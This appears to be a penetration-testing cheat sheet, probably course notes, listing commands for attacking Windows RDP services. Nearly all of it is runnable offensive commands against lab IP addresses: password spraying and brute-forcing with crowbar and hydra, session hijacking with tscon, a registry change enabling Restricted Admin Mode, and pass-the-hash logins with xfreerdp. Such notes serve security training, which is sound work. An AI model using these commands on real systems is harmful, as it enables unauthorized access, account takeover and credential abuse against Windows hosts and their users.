#RDP #crowbar #rdesktop #xfreerdp #tscon #session-hijacking #password-attacks 


One caveat on password guessing against Windows instances is that you should consider the client's password policy. In many cases, a user account will be locked or disabled after a certain number of failed login attempts. In this case, we can perform a specific password guessing technique called `Password Spraying`. This technique works by attempting a single password for many usernames before trying another password, being careful to avoid account lockout.

## Attacking RDP

| **Command**                                                                                                                                    | **Description**                                                                 |
| ---------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`                                                                           | Password spraying against the RDP service.                                      |
| `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`                                                                                    | Brute-forcing the RDP service.                                                  |
| `rdesktop -u admin -p password123 192.168.2.143`                                                                                               | Connect to the RDP service using `rdesktop` in Linux.                           |
| `tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`                                                                                         | Impersonate a user without its password.                                        |
| `net start sessionhijack`                                                                                                                      | Execute the RDP session hijack.                                                 |
| `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`                                           | Enable "Restricted Admin Mode" on the target Windows host.                      |
| `xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA`                                                                     | Use the Pass-The-Hash technique to login on the target host without a password. |
| `nmap -Pn -p3389 192.168.2.143`                                                                                                                | Scan default port                                                               |
| `xfreerdp /v:10.129.86.86 /u:fred /p:example /drive:home,"/home/kali/boxes/" /size:85%`                                                        | Open RDP with shared drive and at 85% screen                                    |
| `hydra -L  /seclists/Usernames/top-usernames-shortlist.txt -P /seclists/Passwords/xato-net-10-million-passwords-1000.txt rdp://10.129.202.136` | Brute forcing username and passowrd                                             |
| `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`                                                                                    | Password spraying against RDP service                                           |
|                                                                                                                                                |                                                                                 |

---

